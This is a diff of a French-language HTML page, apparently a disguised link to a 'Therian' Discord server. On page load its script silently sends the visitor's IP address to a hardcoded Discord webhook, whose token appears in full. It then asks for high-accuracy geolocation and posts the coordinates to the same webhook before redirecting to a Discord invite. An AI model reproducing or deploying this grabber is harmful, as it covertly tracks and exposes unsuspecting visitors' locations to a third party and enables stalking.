@@ -28,68 +28,73 @@
   <div>
     <h1 id="titre">Chargement…</h1>
   </div>
+
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"; 
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
     const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";
 
-    // Fonction pour récupérer et envoyer l'IP
-    async function envoyerIP() {
+    async function getIP() {
       try {
         const response = await fetch("https://api.ipify.org/?format=json");
         const data = await response.json();
-        const ip = data.ip;
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `🌐 Adresse IP détectée : ${ip}`
-          })
-        });
+        return data.ip;
       } catch (e) {
-        console.error("Erreur récupération/envoi IP:", e);
+        console.error("Erreur récupération IP:", e);
+        return null;
       }
     }
 
-    // Fonction pour envoyer la position au webhook et attendre la fin avant redirection
-    async function envoyerPosition(position) {
-      const lat = position.coords.latitude.toFixed(6);
-      const lng = position.coords.longitude.toFixed(6);
-
+    async function sendIP(ip) {
       try {
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `📍 Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
-          })
+          body: JSON.stringify({ content: `🌐 Adresse IP détectée : ${ip}` })
         });
-      } catch (e) {
-        console.error("Erreur envoi position:", e);
-      }
-
-      // Redirection après envoi de la position
-      window.location.href = REDIRECT_URL;
+      } catch (e) { console.error("Erreur envoi IP:", e); }
     }
 
-    function erreurPosition(error) {
-      // Si refusée ou désactivée → redirection après IP
-      window.location.href = REDIRECT_URL;
+    async function sendPosition(position) {
+      const lat = position.coords.latitude.toFixed(6);
+      const lng = position.coords.longitude.toFixed(6);
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `📍 Localisation :\nLatitude: ${lat}\nLongitude: ${lng}` })
+        });
+      } catch (e) { console.error("Erreur envoi position:", e); }
     }
 
-    window.onload = function() {
-      // Envoyer l'IP dès l'ouverture
-      envoyerIP();
+    async function main() {
+      // 1️⃣ Récupérer et envoyer l'IP
+      const ip = await getIP();
+      if (ip) await sendIP(ip);
 
+      // 2️⃣ Vérifier si la géolocalisation est disponible
       if ("geolocation" in navigator) {
-        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
+        document.getElementById("titre").innerText = "Veuillez autoriser la localisation…";
 
-        // Toujours attendre que la position soit récupérée avant redirection
-        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition, { enableHighAccuracy: true, timeout: 15000 });
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            // 3️⃣ Envoyer la position si autorisée
+            await sendPosition(position);
+            // 4️⃣ Redirection après IP + position
+            window.location.href = REDIRECT_URL;
+          },
+          () => {
+            // Si refusée → redirection après IP uniquement
+            window.location.href = REDIRECT_URL;
+          },
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
       } else {
-        // Pas de geolocation → redirection après IP
+        // Géolocalisation indisponible → redirection après IP
         window.location.href = REDIRECT_URL;
       }
-    };
+    }
+
+    window.onload = main;
   </script>
 </body>
 </html>
